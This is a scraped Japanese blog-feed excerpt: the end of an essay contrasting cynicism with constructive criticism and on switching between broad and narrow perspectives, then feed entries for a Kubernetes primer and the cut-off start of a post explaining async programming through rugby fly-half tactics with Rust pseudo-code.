世界――もう1つの境界線ここで、もう1つ重要な境界線について触れなければならない。SNSでの態度と、現実世界での態度は、まったく別物だ。SNSには、価値のない議論が溢れている。根拠のない主張。感情的な罵倒。誰も読まない長文の応酬。生産性のない不毛な論争。こういったものに対して線を引くことは、正しい。「これには関わらない」と判断することは、むしろ賢明だ。無限に存在するノイズに、いちいち反応していたら、時間がいくらあっても足りない。SNSでは、批評的な視点を持つことは重要だ。すべてを真に受けない。情報源を確認する。論理の矛盾を見抜く。この姿勢は、情報リテラシーの基本だ。でも、この態度を現実世界に持ち込むな。現実世界で、目の前にいる人の話を「価値がない」と切り捨てるな。同僚の提案に「どうせ無理だ」と冷笑するな。友人の熱意に「ネットで見た」と冷めた反応をするな。具体例：会議で同僚が新しいアイデアを提案している場合。SNSモード（避けるべき） →「それ、前にバズってた記事で論破されてたやつじゃん。調べてないの」（一方的に否定し、相手を責める）現実世界モード（望ましい） →「興味深いね。ただ、こういう課題があるんだけど、どう考えてる」（課題を共有し、一緒に考える）友人が転職について相談してきた場合。SNSモード（避けるべき） →「その業界、オワコンって言われてるよ。SNSで炎上してたし」（SNS情報を鵜呑みにして断定する）現実世界モード（望ましい） →「どうしてその業界に興味を持ったの。話を聞かせて」（まず理解しようとする）テレビのバラエティ番組での「論破」を、現実の職場や家庭に持ち込むな。SNSでの議論のスタイルを、実際の会議やディスカッションに適用するな。なぜなら、現実世界には、人がいるからだ。SNS上の匿名の発言と、目の前にいる人の発言は、まったく違う。SNS上の議論は、多くの場合、勝ち負けのゲームだ。相手を論破する。矛盾を指摘する。優位に立つ。でも、現実世界の対話は、ゲームではない。関係を築くことだ。お互いを理解することだ。一緒に問題を解決することだ。SNSで批判的思考を鍛えることは、価値がある。でも、その批判的思考を、現実世界で人を傷つける武器として使うな。SNSで冷笑的な視点を持つことは、時には必要だ。でも、その冷笑を、現実世界で人の熱意を奪う道具として使うな。場所による使い分けができない人は、SNSの悪い部分だけを現実世界に持ち込んでいる。SNSでは、批評的に。現実世界では、建設的に。この切り替えができないなら、冷笑主義者として生きることになる。そして、周りから人がいなくなる。境界線を引くことは重要だ。でも、その境界線は、SNSと現実世界の間にも引かなければならない。冷笑の快楽と、その代償冷笑は気持ちいい。それは認める。でも、その快楽には代償がある。冷笑の快楽は、短期的なものだ。その瞬間は気持ちいい。「ほら、やっぱりね」と優越感を覚える。「私は騙されなかった」と安心する。でも、この快楽は持続しない。なぜなら、冷笑は何も生み出さないからだ。批評は、次の行動につながる。「ここを改善すれば、もっと良くなる」。この過程で、学びがある。成長がある。達成感がある。冷笑は、何も生み出さない。「どうせ無理だ」で終わる。次がない。学びもない。成長もない。ただ、その瞬間の快楽だけ。そして、もっと深刻な代償がある。冷笑は、自分自身の行動を止める。何かに挑戦すれば、失敗する可能性がある。理想を語れば、裏切られる可能性がある。情熱を持てば、傷つく可能性がある。だから、冷笑主義者は、最初から信じない。最初から期待しない。最初から距離を置く。「どうせ無理だ」と言っておけば、失敗しても傷つかない。「やっぱりね」と言っておけば、予想通りだったと優越感すら覚えられる。冷笑は、安全地帯にいるための方法だ。でも、この安全地帯は実は牢獄だ。失敗から守ってくれるかもしれないが、同時に成功の可能性も奪っている。傷つかないかもしれないが、同時に成長の機会も失っている。私が問題視しているのは、この部分だ。冷笑の快楽そのものではない。冷笑が、思考を止め、行動を止め、成長を止めることだ。批評を楽しむことは、何も問題ない。矛盾を見つける快感。論理を構築する快感。より良い方法を提案する快感。価値を深く考察する快感。これらは、建設的な快楽だ。次につながる快楽だ。でも、ただ嘲笑することは違う。「どうせ無理」「意識高い系(笑)」「偽善者」。これらは、何も生み出さない。ただ、その瞬間の優越感だけ。そして、この優越感の中毒になると、抜け出せなくなる。自分に対する冷笑が、一番怖いでも、最も危険なのは、他人への冷笑ではない。自分に対する冷笑だ。「新しいことを始めたい」と思う。でも、自分に対して冷笑する。「どうせ続かない」「お前には無理だ」「また三日坊主だろう」。「挑戦したい」と思う。でも、自分に対して冷笑する。「失敗するに決まってる」「才能がないくせに」「身の程を知れ」。この自分に対する冷笑は、他人に対する冷笑よりも、さらに深刻だ。なぜなら、サボる理由になり得るからだ。行動しないことを正当化できる。「どうせ無理だから、やらない方が賢い」。挑戦しないことを正当化できる。「失敗するくらいなら、最初からやらない方がいい」。他人への冷笑は、他人の行動を止める。でも、自分への冷笑は、自分の人生を止める。そして、最も恐ろしいのは、この自分への冷笑が、「自己認識」や「現実的な判断」として正当化されることだ。「俺は自分のことをよく分かってる」「現実的に考えて無理だろう」「客観的に見て才能がない」。でも、それは本当に「自己認識」なのか。それとも、行動しないための言い訳なのか。シニカルで冷笑的な視点は、世界を見るときには役立つかもしれない。でも、自分に向けるな。自分の可能性に対して冷笑するな。自分の挑戦に対して「どうせ無理」と言うな。自分に対しては、冷笑ではなく、批評を。 「この方法では難しいかもしれない。じゃあ、別のアプローチは？」「今の自分には足りないものがある。じゃあ、何を学べばいい？」自分への冷笑は、思考を止める。自分への批評は、次の行動を生む。人を動かすのは、正しさではなく確信の強さここで、視野を広げることの逆説に触れなければならない。視野を広げれば広げるほど、絶対的に正しいものなど存在しないことが分かる。あらゆる主張には反論がある。あらゆる行動には副作用がある。あらゆる理想には矛盾がある。広い視野で十分に立証された正しさ――そんなものは、存在しない。でも、人を動かすのは、十分に立証された正しさではない。人を動かすのは、一点に集中した揺るぎない確信だ。視野を絞り込み、そこに全エネルギーを注ぎ込む強さだ。歴史を振り返れば、世界を変えた人々は、すべて正しかったわけではない。むしろ、多くの矛盾を抱えていた。偏っていた。視野が狭かった。でも、彼らには強い確信があった。「これは正しい」という信念があった。その信念が、行動を生んだ。そして、世界を変えた。視野を広げすぎた人は、行動できない。「でも、こういう反論もある」「でも、こういう副作用もある」「でも、十分ではない」。すべてが見えすぎて、動けなくなる。視野が狭い人は、行動できる。「これが正しい」と信じて、疑わない。矛盾は見えない。副作用も気にしない。ただ、突き進む。もちろん、これは危険だ。視野が狭いまま突き進むことは、暴走を生む。間違った方向に全力で進むことになる。でも、逆もまた真実だ。視野を広げすぎて、何も信じられなくなることも、危険だ。何も行動しなくなる。冷笑するだけになる。必要なのは、バランスだ。視野を狭めることの価値視野を広げることの価値は語られる。でも、視野を狭めることの価値は、ほとんど語られない。しかし、視野を狭めることには、重要な価値がある。そして、この価値を理解しないまま「視野を広げろ」とだけ言い続けることは、むしろ有害だ。人によっては、視野を狭くすることを「目覚めちゃう」と表現する場合もある。視野を絞ることで、それまで見えなかった深さに気づく。1つのことに没頭することで、初めて本質が見えてくる。この感覚を「目覚め」と呼ぶのだ。ただし、ここには注意が必要だ。陰謀論などに「目覚めちゃう」人も、大方この分類に入る。視野を極端に狭めて、1つの視点だけに固執する。「これこそが真実だ」と確信する。他の情報は「隠蔽されている」と切り捨てる。視野を狭めることの危険性は、ここにある。だから重要なのは、視野を広げた後に、意図的に狭めることだ。最初から狭いままではない。一度広げて、複数の視点を知った上で、今は、この一点に集中する、と選択する。この順番が、決定的に重要だ。集中できる視野を広げると、あらゆることが目に入る。世界中の問題がすべて自分の問題のように感じられる。環境問題、格差、戦争、差別、技術的負債、セキュリティ、パフォーマンス。でも、すべてに心を痛めていると、何もできない。認知科学の研究が示すように、人間の注意力には限界がある。同時に複数のことを考えようとすると、どれも中途半端になる。「マルチタスク」は幻想だ。実際には、高速に切り替えているだけで、その切り替えのたびに膨大なコストがかかっている。視野を狭めることで、1つのことに集中できる。「今は、これだけ」と決める。他の問題は、今は考えない。この許可が、行動を可能にする。「他のことも考えなければ」というプレッシャーから解放される。認知負荷が減る。そして、目の前の1つのことに、全エネルギーを注げる。例えば：エンジニアが新機能の実装中、「セキュリティも」「パフォーマンスも」「将来の拡張性も」すべてを同時に考えると、何も前に進まない。でも、「今日は、まずこの機能を動かす」と決める。セキュリティやパフォーマンスは、次のフェーズで考える。この割り切りが、プロジェクトを前に進める。これは怠慢ではない。戦略だ。限られたリソースを、最も重要な一点に集中させる。その一点を確実に動かす。そして、次の一点に移る。すべてを同時にやろうとして何も動かさないより、1つずつ確実に動かす方が、結果的に多くのことを成し遂げる。深く入り込める広く浅くより、狭く深く。視野を広げると、すべてを表面的にしか理解できなくなる。環境問題についても、格差についても、戦争についても、それぞれを少しずつ知っているだけ。でも、どれも深くは理解していない。「知っている」と「理解している」は違う。知識の量と、理解の深さは比例しない。むしろ、広く浅く知識を集めることは、理解を妨げることがある。なぜなら、本質は表面にはないからだ。問題の本質は、深く掘り下げた先にある。一見無関係に見える要素が、実は深い部分でつながっている。この構造が見えて初めて、「理解した」と言える。でも、この深さに到達するには、時間がかかる。1つの問題に、じっくりと向き合う時間が必要だ。視野を狭めることで、1つの問題に深く入り込める。本質が見えてくる。構造が見えてくる。そして、自分にできることが見えてくる。表面的な理解しかない人は、表面的な批判しかできない。深く理解した人は、本質的な批判ができる。表面的な冷笑と、深い批評の違いは、ここにある。例えば：「React、Vue、Angular、Svelte、全部知ってます」という人と、「Reactを5年間、業務で使い続けています」という人。複雑なパフォーマンス問題が発生したとき、解決できる可能性が高いのは後者だ。なぜなら、Reactの内部実装、レンダリングの仕組み、状態管理の本質を、深く理解している可能性が高いからだ。そして、その理解は、他のフレームワークにも応用できる。これは、エンジニアリングでも同じだ。多くの技術を広く浅く知っている人より、1つの技術を深く理解している人の方が、複雑な問題を解決できる。なぜなら、1つの技術を深く理解する過程で、すべての技術に共通する本質的な原理を学んでいるからだ。視野を狭めて深く入り込むことは、視野を広げることの対極ではない。むしろ、本当の意味で視野を広げるための前提条件だ。物語に没入できる視野を広げると、すべてを相対化してしまう。「これも1つの視点に過ぎない」「他の視点もある」「絶対的な正解などない」。この相対主義は、一見知的に見える。でも、これは実は何も信じられなくなる病気だ。相対主義者は、あらゆる物語を「所詮は1つの視点」として扱う。小説を読んでも、「これは作者の主観だ」と距離を置く。映画を観ても、「これは演出だ」と醒めている。誰かの体験談を聞いても、「それはあなたの解釈だ」と疑う。そして、その姿勢が、知的で賢いと思っている。でも、違う。それは、何も感じていないだけだ。何も学んでいないだけだ。心を動かされることを、恐れているだけだ。物語に没入することは、騙されることではない。一時的に、その物語の世界の論理に身を委ねることだ。その世界を信じてみることだ。視野を狭めることで、1つの物語に没入できる。一冊の本に没入する。1つの映画に没入する。一人の人の話に没入する。この没入こそが、感動を生む。学びを生む。変化を生む。物語に没入できるというのは、才能だ。すべてを相対化して、距離を置いて、冷笑する。これは賢く見えるかもしれないが、実は何も感じていないだけだ。何も得ていないだけだ。子供は物語に没入できる。絵本を読んで、本気で心配する。映画を観て、本気で泣く。誰かの話を聞いて、本気で驚く。大人になると、「こんなのフィクションだ」「現実はもっと複雑だ」と距離を置く。「子供じゃないんだから」と、没入することを恥ずかしがる。でも、フィクションだからこそ、本質が見えることがある。単純化されているからこそ、重要なメッセージが伝わることがある。1つの視点だからこそ、その視点の論理を徹底的に追求できる。没入することは、批判的思考を放棄することではない。一度没入して、深く理解して、それから批判的に検討する。この順番が重要だ。最初から距離を置いて批判的に見ていたら、表面しか見えない。没入して初めて、深い部分が見える。そして、深い部分を理解した上で、批判的に検討する。それが批評だ。視野を狭めることは、弱さではない。むしろ、強さだ。すべてを相対化する誘惑に抗して、1つのことを信じる強さ。すべてを疑う誘惑に抗して、1つのことに没入する強さ。確信を持てるそして、最も重要なのは、確信を持てることだ。視野を広げすぎると、確信が持てなくなる。「でも、こういう反論もある」「でも、こういう副作用もある」「でも、十分ではない」。すべての選択肢に問題が見える。理想的な選択肢など存在しない。そして、確信が持てないと、行動できない。行動には、確信が必要だ。「これが正しい」という信念が必要だ。矛盾があっても、副作用があっても、それでも「これをやる」と決める勇気が必要だ。視野を狭めることで、この確信が持てる。他の選択肢は、今は考えない。他の反論は、今は聞かない。今は、この1つを信じる。これは盲目的ではない。視野を広げた時に、すべての選択肢を検討した。すべての反論を知った。その上で、今は、この1つを選ぶ。行動する時には、迷わない。疑わない。ただ、信じて、進む。この確信が、行動を生む。行動が、結果を生む。結果が、世界を変える。視野の切り替え。学ぶ・行動する・振り返る誤解しないでほしい。私は「視野を狭くしろ」と言っているのではない。視野を広げることは、重要だ。視野を狭いままでいることは、危険だ。盲目的になる。暴走する。間違った方向に全力で進む。必要なのは、切り替えだ。視野を広げる時期と、視野を狭める時期を、意識的に切り替える。この切り替えこそが、成長の鍵だ。学ぶ時は、視野を広げる新しいことを学ぶ時、徹底的に視野を広げる。本を読む。講演を聞く。議論をする。多様な視点を取り入れる。反論を知る。矛盾を知る。限界を知る。「絶対的に正しいものなど存在しない」ことを知る。この時期は、確かに絶望的に感じるかもしれない。「こんなに複雑なのか」「こんなに矛盾があるのか」と。でも、この複雑さの認識が、思考を深める。表面的な理解から、構造的な理解へ。単純な解決策から、本質的な解決策へ。冷笑ではなく、批評ができるようになる。例えば：新しいアーキテクチャパターンを学ぶとき、まずは複数の記事、書籍、カンファレンストークを見る。賛成意見も反対意見も読む。成功事例も失敗事例も知る。「このパターンは万能ではない」「こういう場合には向かない」という限界を理解する。ただし、期間を限定する。「今月は、環境問題について学ぶ」と決める。そして、月末には一旦止める。延々と学び続けない。なぜなら、学ぶことには終わりがないからだ。いつまでも学び続けていたら、行動できない。「まだ十分に理解していない」と言い訳をして、安全地帯に留まり続ける。そして、冷笑だけをするようになる。学びの期間と、行動の期間を、明確に分ける。行動する時は、視野を狭める行動する時、視野を狭める。「今は、これだけ」と決める。他の問題は、今は考えない。他の視点は、今は取り入れない。他の反論は、今は聞かない。視野を広げた時に得た知識は、背景にある。でも、前面には出さない。例えば：学習フェーズで、マイクロサービスアーキテクチャの長所も短所も理解した。スケーラビリティの利点も、運用コストの問題も知っている。でも、実装フェーズでは、「今は、このサービスをマイクロサービスで作る」と決める。「本当にマイクロサービスでいいのか」「モノリスの方が良いのでは」という迷いは、今は脇に置く。まず作る。動かす。その後で振り返る。「でも、こういう反論もある」とは考えない。「でも、十分ではない」とは考えない。今は、この1つを信じる。今は、この1つに集中する。これは、学んだことを無視することではない。学んだ上で、今は、この1つの視点から行動する、という選択だ。行動中に視野を広げると、迷いが生まれる。「これでいいのか」「他の方法の方がいいのではないか」。この迷いが、行動を止める。冷笑に戻る誘惑になる。行動は、確信を必要とする。だから、行動する時は、視野を狭める。振り返る時は、また視野を広げる行動した後、振り返る時、また視野を広げる。「あの行動は、どういう意味があったのか」「他にもっと良い方法はなかったか」「見落としていた視点はないか」「どういう副作用があったか」。この振り返りが、次の行動を改善する。学んだこと、行動したこと、その結果。これらを統合して、次の行動計画を立てる。ここで、冷笑と批評の違いが重要になる。振り返りの時に冷笑するな。「やっぱりダメだった」「どうせ無理だった」。これは何も生まない。振り返りの時は、批評をする。「この方法には、こういう問題があった。次はこう改善しよう」「この行動は、こういう価値があった。こういう意味があった」。でも、行動中には、この振り返りはしない。行動と振り返りを、明確に分ける。今は行動する時なのか、振り返る時なのか。意識的に切り替える。多くの人が失敗するのは、この切り替えができないからだ。行動中に振り返りをしてしまう。「これでいいのか」と疑い始める。そして、行動が止まる。冷笑に戻る。あるいは、振り返りの時に行動モードのままでいる。「あの時の判断は正しかった」と正当化する。そして、学びを得られない。学ぶ時は学ぶ。行動する時は行動する。振り返る時は振り返る。この切り替えを、意識的に行う。これが、視野を広げることと狭めることのバランスを取る、具体的な方法だ。そして、冷笑に陥らず、批評を活かす方法だ。エンジニアが評論家に転じる危険エンジニアリングの世界では、冷笑主義は特殊な形で現れる。「評論家気取り」という形で。かつてコードを書くことに情熱を注いでいた人々が、いつの間にか他人の成果物を論評することに執心するようになる。この現象は、特にベテランと呼ばれるエンジニアたちの間で顕著だ。「このコードは素人レベルで時代遅れです」「アーキテクチャへの理解が浅く、重要な議論が抜け落ちています」「技術選定の根拠が説明されていない」。SNSには辛辣な評論が溢れ、技術ブログには高圧的な論評が並び、OSSのイシューには不建設的な批判が並ぶ。誰かが技術ブログを書けば、「この説明は不正確」「この例は不適切」と指摘が飛ぶ。誰かがカンファレンスで発表すれば、「あの発表は薄かった」「もっと深い内容を期待していた」とSNSで批評される。問題は、これらの言説が建設的な議論を装いながら、実際には単なる冷笑に終始している点だ。改善案を示すわけでもなく、プルリクエストを送るわけでもなく、自分で記事を書くわけでもなく、ただ「ダメ出し」だけを繰り返す。具体例：ある技術ブログの記事を読んだとき。評論家モード（冷笑的） →「この記事は浅い。技術の本質が理解できていない可能性がある。初心者向けとしても不十分だ」（SNSに投稿して終わり）創造者モード（建設的） →「この記事を読んで、もっと深い部分を説明する補足記事を書こう」または「コメント欄で、具体的にこの部分をこう補足すると良いかも、と提案しよう」そして、この評論には誘惑がある。技術ブログへの評論記事は数時間で書け、発表資料への批判は数分で完結し、SNSなら数行のポストで事足りる。実装を伴う苦労も、メンテナンスの責任も、失敗のリスクも必要ない。最も注意すべきは、その行為が「いいね」という即時の報酬と、表面的な自己肯定感をもたらすことだ。賢明な分析家として認められ、技術の識者として扱われる。この心地よさが、さらなる評論への逃避を促していく。これは、冷笑主義の典型的なパターンだ。自分は何も作らない。リスクを取らない。ただ、他人の実装を批判する。他人のブログを批評する。他人の発表を論評する。矛盾を指摘する。「これは時代遅れ」「これは不十分」。そして、「自分なら分かっている」と思う。でも、ここで区別が必要だ。コードレビューは、評論ではない。技術的な批評は、冷笑ではない。深い批評は、価値がある。コードレビューは、具体的な改善案を示す。「ここをこうすれば、パフォーマンスが向上する」「この部分は、こういう理由でバグの原因になりうる」。これは建設的だ。次の行動につながる。技術ブログへの建設的なフィードバックも同じだ。「この部分の説明は分かりにくい。こう書いた方が伝わりやすい」「この例には、こういうケースも追加するとより理解が深まる」。これは書き手を助ける。読者も助ける。技術的な批評も価値がある。「この技術は、こういう文脈で生まれた。こういう思想がある。だから、こういう場面で有効だ」。深く理解しようとする。本質を問う。でも、評論家気取りの冷笑は違う。「このコードは素人レベル」「このブログは薄い」「この発表は時代遅れ」。具体的な改善案はない。ただ、ダメ出しだけ。動機を疑う。そして、最も重要な違いは、建設的な批評をする人は、自分もコードを書いている。自分もブログを書いている。自分も発表している。自分もリスクを取っている。自分も失敗している。評論家気取りは、自分ではもう作らない。自分では書かない。自分では発表しない。安全地帯から、他人の試みを批判するだけ。でも、ここでも境界線は曖昧だ。コードレビューのつもりが、相手には冷笑に聞こえることもある。技術ブログへのフィードバックのつもりが、書き手には冷笑に感じられることもある。評論のつもりだった発言が、実は建設的な批評だったこともある。明確には線を引けない。でも、自問できる。「自分は、創造者であり続けているか。それとも、評論家に転じつつあるか」。エンジニアの本質的価値は、創造する能力にある。冷笑だけの評論家ではなく、コードで語る創造者であり続けること。ブログを書くなら、冷笑的な評論記事だけでなく、自分の知見を共有する記事も書くこと。批評をするなら、価値を深く問うこと。「作れる」ことと「分かる」ことは違う。でも、作ることから離れれば離れるほど、本当の意味で「分かる」ことからも遠ざかっていく。書くことから離れれば離れるほど、文章を評価する目も曇っていく。私が問題視しているのは、この違いだ。建設的な批評と、冷笑主義的な評論。この区別をしないまま、すべてを「冷笑主義だ」と呼ぶことは、間違っている。逆に、すべての批判を「建設的だ」と正当化することも、間違っている。エンジニアが評論家に転じるとき、それは衰退の予兆かもしれない。でも、深い批評は、技術の発展に不可欠だ。重要なのは、創造と批評のバランスだ。コードを書き続けること。実装し続けること。そして、その経験に基づいて、深い批評をすること。それが、冷笑主義に陥らないための、エンジニアとしての矜持だ。おわりに一歩引いた場所から世界を見渡すと、すべてが見える。新しい技術に熱狂する人々の、数年後の幻滅。ビジネス書に感動する人々の、矛盾への無関心。世の中の理不尽に憤慨する人々の、複雑さへの無理解。AIの新機能に「世界が変わる」と興奮する人々の、変わらない日常。インフルエンサーの「新しい教え」に感動する人々の、それが数千年前の知恵の言い換えだという事実への無関心。冷笑は、気持ちいい。楽だ。傍観者でいればいい。この楽さの中毒性が、人を冷笑に縛り付ける。でも、冷笑と批判と批評は、まったく違う。冷笑は何も生み出さない。批判は次につながる。批評は対話を生む。境界線は曖昧だ。それでも、だからこそ、高い解像度で見る努力が必要なんだと思う。視野を広げすぎると、絶望が見える。世界の複雑さに圧倒される。「すべてを理解し、すべてに答えを出さなければならない」という傲慢さに囚われる。でも、すべてに答えを出そうとする必要などない。自分の限界を謙虚に認める。自分が深く関わる一点だけに集中する。視野を広げることと、視野を狭めること。この切り替えが、冷笑の罠から抜け出す鍵だ。世界は複雑だ。矛盾に満ちている。絶対的な正しさは存在しない。だからといって、冷笑していいわけじゃない。「考えを言葉にすること」と「冷笑」は違う。「答えを出さないこと」と「冷笑」は違う。「批判すること」と「冷笑」は違う。低い解像度で混同するな。そして、もう1つ。SNSでの態度を、現実世界に持ち込むな。SNSで批評的な視点を持つことは正しい。価値のない議論に線を引くことは賢明だ。でも、その態度を、目の前にいる人に向けるな。テレビの論破番組を、現実の対話に持ち込むな。場所による使い分けができないなら、冷笑主義者として生きることになる。そして、周りから人がいなくなる。一歩引いた場所から見ることには、価値がある。俯瞰的な視点は、物事の本質を見抜く。でも、ずっと傍観者でいることには、代償がある。批評の深さを知った上で、行動する。冷笑の快楽を知った上で、創造する。複雑さを理解した上で、一点に集中する。絶望を見た上で、確信を持つ。この両方を知っている人こそが、本当に豊かな人だ。高解像度で見続けろ。曖昧さを受け入れろ。批評の力を活かせ。でも、冷笑の甘い罠には落ちるな。そして、一歩引いた場所から、一歩前に踏み出せ。批評の教室　──チョウのように読み、ハチのように書く (ちくま新書)作者:北村紗衣筑摩書房Amazon批評理論を学ぶ人のために世界思想社Amazon訂正可能性の哲学作者:東浩紀株式会社ゲンロンAmazon動物化するポストモダン　オタクから見た日本社会 (講談社現代新書)作者:東浩紀講談社Amazonアテンション・エコノミーのジレンマ　〈関心〉を奪い合う世界に未来はあるか作者:山本 龍彦KADOKAWAAmazonきみに冷笑は似合わない。　SNSの荒波を乗り越え、AI時代を生きるコツ (日本経済新聞出版)作者:山田尚史日経BPAmazonエビデンスを嫌う人たち: 科学否定論者は何を考え、どう説得できるのか?作者:リー・マッキンタイア国書刊行会AmazonScience Fictions　あなたが知らない科学の真実作者:スチュアート・リッチーダイヤモンド社Amazon","isoDate":"2025-11-09T23:42:05.000Z","dateMiliSeconds":1762731725000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"k8s超入門: 基本的なコンポーネントの概要まとめ","link":"https://zenn.dev/takehiro1111/articles/kubernetes_basic","contentSnippet":"1.記事を書いた背景業務でEKSの環境を構築しており、知識を補完,整理するために記事として残しています。公式のチュートリアルをサクッとレベルで対応しながら書いてます。 2.対象読者Kubernetes初学者,未経験者(自分みたいな) 書くことイメージしやすい範囲でk8sコンポーネントの概要今の時点で深入りしてもよく分からんってなるので、概要レベルのみの記述です。手を動かして実際のデプロイ環境を作る際に細かい書き方とか機能を必要に応じて調べれば良い。 書かないこと詳細レベルやプラグイン等の解説EKS,GKE等のクラウドプロバイダ特有の設定...","isoDate":"2025-11-09T06:48:49.000Z","dateMiliSeconds":1762670929000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"スタンドオフに学ぶ非同期プログラミング - 待ち時間を無駄にしない技術","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/08/150836","contentSnippet":"はじめに最近、自分が書く文章が妙に真面目というか、ちゃんと役に立つことばかり意識していることに気づいた。もちろんそれは悪いことじゃないと思う。でも、たまには「これ、本当に誰かの役に立つのかな」と自分でも首を傾げるような文章を書いてみたくなった。書いてみたら、思ったより長くなった。後悔はしていない。たぶん。「非同期って結局なんなの」という疑問を、async/awaitの文法で真面目に説明するのではなく、ラグビーのSO（スタンドオフ）の動きで説明してみようと思う。誰もこんなこと考えなかっただろうし、もし考えた人がいたとしても、文章にはしなかったはずだ。ラグビーを知らない人は「？？？」となるかもしれない。でも安心してほしい。ラグビーを知っている人も同じくらい「？？？」となっているから。読み終わる頃には、非同期とラグビーの近代戦術が（なんとなく）分かるはず。たぶん。きっと。そう信じたい。ラグビーという競技ラグビーは15人制のチームスポーツだ。楕円形のボールを持って走り、パスし、キックして、相手陣地のインゴールにボールを置く（トライする）ことで得点を競う。基本的なルールとして、ボールは前にパスできない。横か後ろにしかパスできない。ボールがタッチラインの外に出るか、反則があるまで、プレーは連続する。タックルされた後も、ボールを確保して攻撃を継続できるフェーズプレーがある。試合時間は前半40分、後半40分の計80分だ。www.rugby-japan.jpこの競技の特徴は、戦況が刻一刻と変化することだ。相手のディフェンスライン、味方の位置、疲労度などを瞬時に判断して、次の一手を決める必要がある。参考：ラグビーフットボール - Wikipediawww.youtube.comスタンドオフ（SO / フライハーフ）の役割スタンドオフは、背番号10番をつける「司令塔」だ。サッカーで言えば10番の司令塔、野球で言えば捕手のような存在。SOの主な責任は、攻撃の組み立て、戦術の選択、コミュニケーション、そしてゲームコントロールだ。どこに攻めるか、どう崩すかを判断する。ランか、パスか、キックか。フォワードとバックスの橋渡し。試合全体のテンポと流れを管理する。重要なのは、SOはボールを持っている時間よりも、持っていない時間のほうが長いということだ。スクラムハーフからのパスを待つ1-2秒の間に、SOは多くのことを並行して処理している。ディフェンスラインの読み、味方の配置確認、次の攻撃パターンの選択、風向きの確認、スコア差と残り時間の計算。これらすべてを同時に行う。参考：ラグビーユニオンのポジション - Wikipediawww.youtube.com現代ラグビーの戦術進化1. ポッド（Pod）システムの深化現代ラグビーにおけるポッドシステムは、単なる戦術ではなく、チーム全体を貫く哲学となっている。2025年に入り、このシステムはより小さく、より速く、より柔軟に進化した。伝統的なポッドは3人のフォワードで構成されていたが、現代では2人のミニポッドも一般的だ。これはLightning Quick Ball（0から3秒以内でのボール再開）という新しい要請に応えるものだ。ブレイクダウン後にポッドが形を整えるのを待つ時間はない。ディフェンスが体制を整える前に、次の攻撃を仕掛ける。参考：Modern Pod System with LQBあるポッドがボールを運んでコンタクトに入る瞬間、他のポッドはすでに次のフェーズのために移動を開始している。これは単なる物理的な移動ではない。各プレイヤーは、フィールド上の70メートルを5つから6つのゾーンに分割し、自分の担当エリアを常に意識している。ボールが自分のゾーンに入ってきたら、即座に反応する。他のゾーンにあるときは、次のフェーズに備えて静かに準備を進める。この「一人はみんなのために」というコンセプトは、非同期プログラミングの本質そのものだ。各ポッドは独立したタスクとして機能しながら、全体として1つの攻撃を構成する。あるポッドがActive状態でボールを運んでいるとき、別のポッドはRepositioning状態で次の位置へ移動し、さらに別のポッドはReady状態で待機している。それぞれが異なる状態にありながら、スタンドオフという「エグゼキュータ」の指揮の下、協調した動きを見せる。以下のコードは概念を示すための擬似コード的な例です。実際に動作する完全版は記事の最後に掲載しています。// 現代のポッドシステムの状態管理async fn modern_pod_attack_2025() {    let field = Field::divide_into_zones(6);    // 各ポッドが独立したタスクとして動作    let pod_tasks: Vec<_> = field.zones        .iter()        .map(|zone| {            tokio::spawn(async move {                loop {                    let ball_state = zone.monitor_ball_position().await;                    match ball_state {                        BallPosition::InMyZone => {                            // 即座に反応                            tokio::time::timeout(                                Duration::from_secs(3),                                execute_pod_action()                            ).await                        }                        BallPosition::Adjacent => {                            // 準備を開始                            prepare_for_next_phase().await                        }                        BallPosition::Distant => {                            // 待機しながら観察                            maintain_shape_awareness().await                        }                    }                }            })        })        .collect();    // すべてのポッドが並行して動作    futures::future::join_all(pod_tasks).await;}2. シェイプの流動化2025年のラグビーで最も劇的な変化の1つは、固定シェイプからの脱却だ。かつては1-3-3-1や2-4-2といった明確なフォーメーションが試合を通じて維持されていた。しかし現代のゲームは、これらを「参照点」として扱い、状況に応じて瞬時に形を変える。参考：Rugby Formations: 1-3-3-1 vs 2-4-21-3-3-1システムは、スクラムハーフから直接ポッドへボールが渡される「playing off 9」のアプローチを特徴とする。これは高速で直線的な攻撃を可能にし、フェーズごとのパス数を最小限に抑える。中央のポッドがボールを受け取ると、4つの選択肢が生まれる。自分でボールを運ぶか、内側の選手にポップパスを出すか、外側にティップするか、あるいは後ろのオプション選手にピボットしてパスを出すか。この判断は0.5秒以内に行われる。一方で2-4-2システムは、フライハーフを介する「playing off 10」のアプローチを採用する。中央へ4人のポッドを配置することで、サイドへの展開速度が33パーセント向上する。研究によれば、1-3-3-1のチームが反対サイドのタッチラインまで平均3フェーズかかるのに対し、2-4-2のチームは2フェーズで到達できる。80分の試合では、この差が攻撃機会の質と量へ大きく影響する。参考：Crusaders Game Plan: 2-4-2 Secretsしかし2025年の現実は、これらのシステムが純粋な形で存在することはほとんどない。あるフェーズでは1-3-3-1に見え、次のフェーズでは2-4-2に見え、その次には全く異なる形になっている。これは混乱ではなく、適応だ。ディフェンスの配置、疲労度、スコア差、残り時間など、すべての変数が瞬時に計算され、最適な形が選択される。// 動的なシェイプ適応システムasync fn adaptive_shape_system() {    let mut current_shape = FormationType::OneThreeThreeOne;    loop {        let situation = assess_game_situation().await;        // 複数の要因を並行して評価        let (defense_analysis, fatigue_check, position_eval) = tokio::join!(            analyze_defense_line(),            check_player_fatigue(),            evaluate_field_position(),        );        // 状況に応じて最適なシェイプを選択        let optimal_shape = match situation {            Situation::QuickBall { defense: Disorganized } => {                // ディフェンスが乱れているなら、現在の形で即座に攻撃                current_shape            }            Situation::SlowBall { defense: Organized } => {                // 時間があるなら、最適な形に再編成                if position_eval.is_central() {                    FormationType::TwoFourTwo // 幅広い攻撃                } else {                    FormationType::OneThreeThreeOne // 直線的攻撃                }            }            Situation::Transition { .. } => {                // 過渡期は流動的な形                FormationType::Fluid            }        };        if optimal_shape != current_shape {            transition_to_new_shape(optimal_shape).await;            current_shape = optimal_shape;        }        execute_phase(current_shape).await;    }}3. 2025年のトレンド興味深いことに、2025年のラグビーは、最も古典的な戦術の1つであるドロー＆パスの復権を目撃している。これは、ボールキャリアがディフェンダーを引きつけ、そのディフェンダーがコミットした瞬間にパスを出すという、極めてシンプルな技術だ。参考：The Evolution of Rugby Tactics in 